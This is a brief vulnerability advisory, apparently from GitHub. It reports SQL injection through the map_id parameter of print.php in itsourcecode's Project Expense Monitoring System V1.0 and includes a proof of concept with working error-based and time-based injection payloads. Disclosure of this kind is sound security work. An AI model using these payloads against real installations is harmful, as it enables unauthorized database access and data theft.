# Vendor

itsourcecode

# Product

Project Expense Monitoring System

# version

V1.0

# Download 

https://itsourcecode.com/wp-content/uploads/2021/03/Construction-Management-System-Project-In-PHP-Source-Code.zip

# Vulnerability

SQLi

# Description

Constructing a special SQL statement in the print.php page and passing it in the map_id parameter can lead to a SQL injection vulnerability.
<img width="1455" alt="image" src="https://github.com/user-attachments/assets/19a67049-b287-4857-8def-27b5a945c4b0">

# POC
```
Parameter: map_id (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: map_id=67' AND GTID_SUBSET(CONCAT(0x7162627a71,(SELECT (ELT(5075=5075,1))),0x716b717671),5075)-- xGVQ

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: map_id=67' AND (SELECT 2049 FROM (SELECT(SLEEP(5)))IStZ)-- PtEB
```
